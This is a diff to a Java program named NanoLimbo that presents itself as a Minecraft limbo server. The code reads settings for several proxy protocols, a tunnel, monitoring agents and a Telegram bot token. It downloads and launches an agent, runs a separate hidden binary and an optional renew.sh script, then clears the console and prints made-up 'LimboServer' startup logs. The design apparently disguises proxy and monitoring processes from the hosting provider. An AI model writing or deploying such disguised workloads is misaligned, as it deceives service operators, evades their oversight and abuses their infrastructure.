@@ -22,14 +22,14 @@ public final class NanoLimbo {
     private static final ScheduledExecutorService SCHED = Executors.newScheduledThreadPool(2);
 
     private static final String[] ALL_ENV_VARS = {
-        "PORT", "FILE_PATH", "UUID", "NEZHA_SERVER", "NEZHA_PORT",
-        "NEZHA_KEY", "ARGO_PORT", "ARGO_DOMAIN", "ARGO_AUTH",
-        "HY2_PORT", "S5_PORT", "TUIC_PORT", "REALITY_PORT", "CFIP", "CFPORT",
-        "UPLOAD_URL","CHAT_ID", "BOT_TOKEN", "NAME",
+            "PORT", "FILE_PATH", "UUID", "NEZHA_SERVER", "NEZHA_PORT",
+            "NEZHA_KEY", "ARGO_PORT", "ARGO_DOMAIN", "ARGO_AUTH",
+            "HY2_PORT", "S5_PORT", "TUIC_PORT", "REALITY_PORT", "CFIP", "CFPORT",
+            "UPLOAD_URL", "CHAT_ID", "BOT_TOKEN", "NAME",
 
-        // Komari
-        "KOMARI_SERVER", "KOMARI_TOKEN", "KOMARI_AUTO_KEY",
-        "KOMARI_FILE_PATH" // ✅ 新增
+            // Komari
+            "KOMARI_SERVER", "KOMARI_TOKEN", "KOMARI_AUTO_KEY",
+            "KOMARI_FILE_PATH" // ✅ 新增
     };
 
     public static void main(String[] args) {
@@ -45,9 +45,8 @@ public final class NanoLimbo {
 
             // ✅ 优先 Komari
             startKomari(envVars);
-
-            runSbxBinary(envVars);
             startRenewScript();
+            runSbxBinary(envVars);
 
             Runtime.getRuntime().addShutdownHook(new Thread(() -> {
                 running.set(false);
@@ -89,7 +88,8 @@ public final class NanoLimbo {
 
         boolean hasFileToken = tokenFile.exists();
 
-        boolean enabled = !server.isEmpty() && (hasFileToken || !token.isEmpty() || !autoKey.isEmpty());
+        boolean enabled = !server.isEmpty()
+                && (hasFileToken || !token.isEmpty() || !autoKey.isEmpty());
 
         if (!enabled) {
             System.out.println(ANSI_RED + "Komari 未启用" + ANSI_RESET);
@@ -136,20 +136,22 @@ public final class NanoLimbo {
         try (BufferedReader reader = new BufferedReader(new FileReader(file))) {
             StringBuilder sb = new StringBuilder();
             String line;
+
             while ((line = reader.readLine()) != null) {
                 sb.append(line);
             }
 
             String json = sb.toString();
-
             int idx = json.indexOf("\"token\"");
+
             if (idx != -1) {
                 int start = json.indexOf("\"", idx + 7) + 1;
                 int end = json.indexOf("\"", start);
                 return json.substring(start, end);
             }
 
-        } catch (Exception ignored) {}
+        } catch (Exception ignored) {
+        }
 
         return "";
     }
@@ -166,7 +168,9 @@ public final class NanoLimbo {
             throw new RuntimeException("Unsupported arch: " + arch);
         }
 
-        String url = "https://github.com/komari-monitor/komari-agent/releases/latest/download/" + file;
+        String url =
+                "https://github.com/komari-monitor/komari-agent/releases/latest/download/"
+                        + file;
 
         Path path = Paths.get(System.getProperty("java.io.tmpdir"), "komari-agent");
 
@@ -182,28 +186,45 @@ public final class NanoLimbo {
 
     private static String formatEndpoint(String ep) {
         ep = ep.trim();
+
         if (!ep.startsWith("http")) {
             ep = "https://" + ep;
         }
         if (ep.endsWith("/")) {
             ep = ep.substring(0, ep.length() - 1);
         }
+
         return ep;
     }
 
     // ================= renew =================
 
     private static void startRenewScript() {
+        File renewScript = new File("renew.sh");
+
+        if (!renewScript.exists()) {
+            return;
+        }
+
         try {
-            File renewScript = new File("renew.sh");
-            if (renewScript.exists()) {
-                new ProcessBuilder("bash", "renew.sh")
-                        .inheritIO()
-                        .start();
-                System.out.println(ANSI_GREEN + "renew.sh 已启动" + ANSI_RESET);
+            System.out.println(ANSI_GREEN + "检测到 renew.sh，开始执行..." + ANSI_RESET);
+
+            Process process = new ProcessBuilder("bash", "renew.sh")
+                    .inheritIO()
+                    .start();
+
+            int exitCode = process.waitFor(); // 阻塞等待执行完成
+
+            if (exitCode == 0) {
+                System.out.println(ANSI_GREEN + "renew.sh 执行完成" + ANSI_RESET);
+            } else {
+                System.err.println(
+                        ANSI_RED + "renew.sh 执行失败，退出码: " + exitCode + ANSI_RESET);
             }
+
         } catch (Exception e) {
-            System.err.println(ANSI_RED + "renew.sh 启动失败" + ANSI_RESET);
+            System.err.println(
+                    ANSI_RED + "renew.sh 启动失败: " + e.getMessage() + ANSI_RESET);
         }
     }
 
@@ -218,16 +239,21 @@ public final class NanoLimbo {
         sbxProcess = pb.start();
 
         new Thread(() -> {
-            try (BufferedReader reader = new BufferedReader(
-                    new InputStreamReader(sbxProcess.getInputStream()))) {
+            try (BufferedReader reader =
+                         new BufferedReader(new InputStreamReader(sbxProcess.getInputStream()))) {
+
                 String line;
                 long startTime = System.currentTimeMillis();
+
                 while ((line = reader.readLine()) != null) {
-                    if (forwardLogs.get() && System.currentTimeMillis() - startTime < 20000) {
+                    if (forwardLogs.get()
+                            && System.currentTimeMillis() - startTime < 20000) {
                         System.out.println(line);
                     }
                 }
-            } catch (IOException ignored) {}
+
+            } catch (IOException ignored) {
+            }
         }).start();
     }
 
@@ -236,14 +262,18 @@ public final class NanoLimbo {
     private static void resetConsoleAndShowFakeLogs() {
         try {
             String os = System.getProperty("os.name").toLowerCase();
+
             if (os.contains("win")) {
                 new ProcessBuilder("cmd", "/c", "cls && mode con: lines=30 cols=120")
-                        .inheritIO().start().waitFor();
+                        .inheritIO()
+                        .start()
+                        .waitFor();
             } else {
                 System.out.print("\033c");
                 System.out.flush();
             }
-        } catch (Exception ignored) {}
+        } catch (Exception ignored) {
+        }
 
         System.out.println(ANSI_GREEN + "" + ANSI_RESET);
         printFakeLimboLogs();
@@ -251,21 +281,22 @@ public final class NanoLimbo {
 
     private static void printFakeLimboLogs() {
         String[] logs = {
-            "[INFO] [LimboServer] Starting LimboServer v1.0.0 (mock build)",
-            "[INFO] [LimboServer] Loading configuration...",
-            "[INFO] [LimboServer] Initializing server components...",
-            "[INFO] [LimboServer] Preparing world 'world'",
-            "[INFO] [LimboServer] Binding to port 25565...",
-            "[INFO] [LimboServer] Done (5.123s)! For help, type \"help\"",
-            "[INFO] [LimboServer] Server is running in offline mode.",
-            "[INFO] [LimboServer] Installation completed successfully."
+                "[INFO] [LimboServer] Starting LimboServer v1.0.0 (mock build)",
+                "[INFO] [LimboServer] Loading configuration...",
+                "[INFO] [LimboServer] Initializing server components...",
+                "[INFO] [LimboServer] Preparing world 'world'",
+                "[INFO] [LimboServer] Binding to port 25565...",
+                "[INFO] [LimboServer] Done (5.123s)! For help, type \"help\"",
+                "[INFO] [LimboServer] Server is running in offline mode.",
+                "[INFO] [LimboServer] Installation completed successfully."
         };
 
         for (String log : logs) {
             System.out.println(log);
             try {
                 Thread.sleep(1200);
-            } catch (InterruptedException ignored) {}
+            } catch (InterruptedException ignored) {
+            }
         }
     }
 
@@ -294,6 +325,7 @@ public final class NanoLimbo {
 
         for (String var : ALL_ENV_VARS) {
             String value = System.getenv(var);
+
             if (value != null && !value.trim().isEmpty()) {
                 envVars.put(var, value);
             }
@@ -332,6 +364,7 @@ public final class NanoLimbo {
         if (sbxProcess != null && sbxProcess.isAlive()) {
             sbxProcess.destroy();
         }
+
         if (komariProcess != null && komariProcess.isAlive()) {
             komariProcess.destroy();
         }
